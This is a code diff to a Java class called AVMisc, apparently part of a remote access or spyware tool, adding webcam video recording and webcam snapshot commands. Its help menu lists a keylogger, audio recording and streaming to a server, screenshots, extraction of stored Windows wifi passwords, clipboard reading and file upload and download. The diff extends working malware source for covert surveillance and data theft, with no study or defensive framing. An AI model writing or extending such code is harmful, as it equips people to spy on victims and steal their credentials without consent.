@@ -25,12 +25,14 @@ import java.nio.file.StandardOpenOption;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.Arrays;
+import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Scanner;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import java.util.stream.Collectors;
+import java.util.InputMismatchException;
 
 import javax.imageio.ImageIO;
 import javax.sound.sampled.AudioSystem;
@@ -38,7 +40,7 @@ import javax.sound.sampled.Mixer.Info;
 
 import org.apache.commons.net.ftp.FTPClient;
 import org.apache.commons.net.ftp.FTPReply;
-
+import org.jcodec.api.awt.AWTSequenceEncoder;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
@@ -50,17 +52,24 @@ import de.ralleytn.simple.audio.AudioException;
 import de.ralleytn.simple.audio.Recorder;
 import de.ralleytn.simple.audio.StreamedAudio;
 
+import com.github.sarxos.webcam.Webcam;
+import com.github.sarxos.webcam.WebcamException;
+
+
+
 public class AVMisc implements NativeKeyListener {
 	private static final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM_dd_YYYY_HH_mm_ss");
 	private static final DateTimeFormatter logDTF = DateTimeFormatter.ofPattern("MM-dd-YYYY HH:mm:ss");
 	private static final String OS = System.getProperty("os.name");
-	private long RECORD_TIME = 0;
+	private long AUDIO_RECORD_TIME = 0;
 	private AtomicBoolean recordingAudio = new AtomicBoolean();
 	private AtomicBoolean playingAudio = new AtomicBoolean();
 	private AtomicBoolean stopStreaming = new AtomicBoolean();
+	private AtomicBoolean recordingVideo = new AtomicBoolean();
 	private Scanner sc = new Scanner(System.in);
 	private Thread recordingAudioThread;
 	private Thread playingAudioThread;
+	private Thread recordingVideoThread;
 	private FTPClient ftp;
 	private String recordingAudioFileName;
 	private String playingAudioFileName;
@@ -84,9 +93,11 @@ public class AVMisc implements NativeKeyListener {
 		recordingAudio.set(false);
 		playingAudio.set(false);
 		stopStreaming.set(false);
+		recordingVideo.set(false);
 		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
 		logger.setLevel(Level.OFF);
 		logger.setUseParentHandlers(false);
+		
 	}
 	
 	
@@ -98,6 +109,7 @@ public class AVMisc implements NativeKeyListener {
 			switch (command.toLowerCase()) {
 				case "list":
 					listAudioDevices();
+					listVideoDevices();
 					break;
 				case "start_audio_record":
 					recordAudio(false);
@@ -117,8 +129,17 @@ public class AVMisc implements NativeKeyListener {
 				case "stop_streaming_audio":
 					stopRecordingAudio();
 					break;
+				case "start_video_record":
+					recordVideo();
+					break;
+				case "stop_video_record":
+					stopRecordingVideo();
+					break;
 				case "screenshot":
 					takeScreenshot();
+					break;
+				case "snapshot":
+					takeSnapshot();
 					break;
 				case "start_kl":
 					startKeylogger();
@@ -164,6 +185,19 @@ public class AVMisc implements NativeKeyListener {
 			}
 		}
 		audioSystem = null;
+	}
+	
+	private void listVideoDevices() {
+		List<Webcam> webcams = Webcam.getWebcams();
+		if(webcams.size() != 0) {
+			System.out.println("\n------------------------\n     VIDEO DEVICES\n------------------------");
+			webcams.forEach((webcam) -> {
+				System.out.printf("\tName: %s\n", webcam.getName());
+			});
+		}
+		else {
+			System.out.println("\nNo video devices");
+		}
 	}
 	
 	/***
@@ -225,7 +259,7 @@ public class AVMisc implements NativeKeyListener {
 					}
 					// Recording audio to save to a file
 					else {
-						RECORD_TIME = recordingAudioTime * 1000;
+						AUDIO_RECORD_TIME = recordingAudioTime * 1000;
 						recordingAudioFileName = String.format("Audio_%s.au", dtf.format(LocalDateTime.now()));
 						
 						try(FileOutputStream fos = new FileOutputStream(recordingAudioFileName)) {
@@ -233,7 +267,7 @@ public class AVMisc implements NativeKeyListener {
 							recorder.start(fos);
 							recordingAudio.set(true);
 							System.out.println("Recording...");
-							Thread.sleep(RECORD_TIME);
+							Thread.sleep(AUDIO_RECORD_TIME);
 						} 
 						catch (AudioException | IOException e) {
 							System.out.println(e.getMessage());
@@ -309,6 +343,58 @@ public class AVMisc implements NativeKeyListener {
 	
 	
 	/***
+	 * Record Video
+	 */
+	private void recordVideo() {
+		if(!recordingVideo.get()) {
+			System.out.print("Enter the number of seconds to record (About 500 KB/S): ");
+			int seconds = sc.nextInt();
+			
+			recordingVideoThread = new Thread() {
+				public void run() {
+					try {
+						String fileName = String.format("Video_%s.mp4", dtf.format(LocalDateTime.now()));
+						File file = new File(fileName);
+						Webcam webcam = Webcam.getDefault();
+						recordingVideo.set(true);
+						webcam.open();
+						
+						AWTSequenceEncoder encoder = AWTSequenceEncoder.createSequenceEncoder(file, 25);
+						int framesToEncode = seconds * 50;
+						BufferedImage image = null;
+						System.out.println("Recording");
+						
+						for(int i = 0; i < framesToEncode/2; i++) {
+							image = webcam.getImage();
+							encoder.encodeImage(image);
+						}
+						webcam.close();
+						encoder.finish();
+						System.out.printf("Video saved as %s", fileName);
+						
+					}
+					catch (InputMismatchException | IOException e) {
+						System.out.println(e.getMessage());
+					}
+					finally {
+						recordingVideo.set(false);
+					}
+				}
+			};
+			recordingVideoThread.start();
+		}
+	}
+	
+	/***
+	 * Stop Recording Video
+	 */
+	private void stopRecordingVideo() {
+		if(recordingVideo.get()) {
+			recordingVideoThread.interrupt();
+		}
+	}
+	
+	/***
 	 * Take a Screenshot
 	 */
 	private void takeScreenshot() {
@@ -325,6 +411,31 @@ public class AVMisc implements NativeKeyListener {
 		}
 	}
 
+	
+	
+	/***
+	 * Take a Snapshot
+	 */
+	private void takeSnapshot() {
+		List<Webcam> webcams = Webcam.getWebcams();
+		if(webcams.size() > 0) {
+			try {
+				System.out.print("Enter the webcam name: ");
+				String webcamName = sc.nextLine();
+				Webcam webcam = Webcam.getWebcamByName(webcamName);
+				webcam.open();
+				
+				BufferedImage image = webcam.getImage();
+				String fileName = String.format("Snapshot_%s.png", dtf.format(LocalDateTime.now()));
+				ImageIO.write(image, "PNG", new File(fileName));
+				webcam.close();
+				System.out.printf("Snapshot saved as '%s'\n", fileName);
+			}
+			catch (WebcamException | NullPointerException | IOException e) {
+				System.out.println(e.getMessage());
+			}
+		}
+	}
 	
 	/***
 	 * Start Keylogger
@@ -527,23 +638,31 @@ public class AVMisc implements NativeKeyListener {
 	 * Show Help
 	 */
 	private void showHelp() {
-		String helpMsg = "------------------------\n     AVMISC OPTIONS\n------------------------\n"
-				+ "\t'list': List the audio devices on the system\n\n"
-				+ "\t'start_audio_record': Start recording audio on the system\n\n"
-				+ "\t'stop_audio_record': Stop recording audio\n\n"
-				+ "\t'start_audio_playback': Play an audio file on the system\n\n"
-				+ "\t'stop_audio_playback': Stop playing audio\n\n"
-				+ "\t'start_streaming_audio': Connects to a server and starts streaming audio\n\n"
-				+ "\t'stop_streaming_audio': Stop streaming audio\n\n"
-				+ "\t'screenshot': Take a screenshot\n\n"
-				+ "\t'start_kl': Start the keylogger\n\n"
-				+ "\t'stop_kl': Stop the keylogger\n\n"
-				+ "\t'wifi': Get the passwords for the wireless profiles on the system(Windows only)\n\n"
-				+ "\t'clipboard': View the contents of the clipboard\n\n"
-				+ "\t'upload': Upload a file to the server\n\n"
-				+ "\t'download': Download a file from the server\n\n"
-				+ "\t'help': Show this help message\n";
-		System.out.println(helpMsg);
+		LinkedHashMap<String, String> helpItems = new LinkedHashMap<>();
+		helpItems.put("list", "List the audio devices on the system");
+		helpItems.put("start_audio_record", "Start recording audio on the system");
+		helpItems.put("stop_audio_record", "Stop recording audio");
+		helpItems.put("start_audio_playback", "Play an audio file on the system");
+		helpItems.put("stop_audio_playback", "Stop playing audio");
+		helpItems.put("start_streaming_audio", "Connects to a server and starts streaming audio");
+		helpItems.put("stop_streaming_audio", "Stop streaming audio");
+		helpItems.put("start_video_record", "Start recording video");
+		helpItems.put("stop_video_record", "Stop recording video");
+		helpItems.put("screenshot", "Take a screenshot");
+		helpItems.put("snapshot", "Take a snapshot with the webcam");
+		helpItems.put("start_kl", "Start the keylogger");
+		helpItems.put("stop_kl", "Stop the keylogger");
+		helpItems.put("wifi", "Get the passwords for the wireless profiles on the system(Windows only)");
+		helpItems.put("clipboard", "View the contents of the clipboard");
+		helpItems.put("upload", "Upload a file to the server");
+		helpItems.put("download", "Download a file from the server");
+		helpItems.put("help", "Show this help message");
+		
+		System.out.println("------------------------\n     AVMISC OPTIONS\n------------------------\n");
+		helpItems.forEach((key, value) -> {
+			System.out.printf("\t'%s': %s\n\n", key, value);
+		});
+		
 	}
 	
 	
